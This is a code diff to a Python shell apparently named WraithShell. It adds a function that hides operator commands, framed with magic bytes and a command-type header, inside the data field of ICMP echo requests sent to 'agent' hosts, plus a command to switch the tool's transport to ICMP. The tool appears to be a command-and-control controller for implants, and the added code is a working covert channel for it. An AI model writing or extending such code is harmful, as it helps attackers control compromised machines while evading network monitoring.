@@ -41,6 +41,22 @@ def send_packet_UDP(cmd, cmd_type, agent_ip, port):
 
     send(pkt, verbose=False)
 
+def send_packet_ICMP(cmd, cmd_type, agent_ip, port):
+
+    print("Sending via ICMP")
+
+    # Assemble header, same as TCP/UDP: [MAGIC][CMD TYPE][CMD LENGTH] big endian
+    packet = struct.pack(">III", MAGIC_BYTES, CMD_MAP[cmd_type], len(cmd))
+
+    # Add on payload
+    packet += cmd.encode()
+
+    # Type 8 = echo request, payload rides in the data field
+    # Randomize id so multiple in-flight requests don't collide
+    pkt = IP(dst=agent_ip) / ICMP(type=8, code=0, id=random.randint(0, 65535), seq=1) / Raw(load=packet)
+
+    send(pkt, verbose=False)
+
 def parse_IP_file(file_path):
 
     IP_list = []
@@ -329,7 +345,7 @@ class WraithShell(cmd.Cmd):
 
     # Handle protocol switching
     def do_protocol(self, arg):
-        """protocol [tcp | udp]"""
+        """protocol [tcp | udp | icmp]"""
 
         match arg.strip().lower():
 
@@ -352,6 +368,15 @@ class WraithShell(cmd.Cmd):
                     self.current_protocol = "UDP"
                     self._update_prompt()
                     print("Switched send protocol to UDP")
+
+            case "icmp":
+                if self.sender_wrapper == send_packet_ICMP:
+                    print("Send protocol is already ICMP")
+                else:
+                    self.sender_wrapper = send_packet_ICMP
+                    self.current_protocol = "ICMP"
+                    self._update_prompt()
+                    print("Switched send protocol to ICMP")
 
             case _:
                 print(self.do_protocol.__doc__)
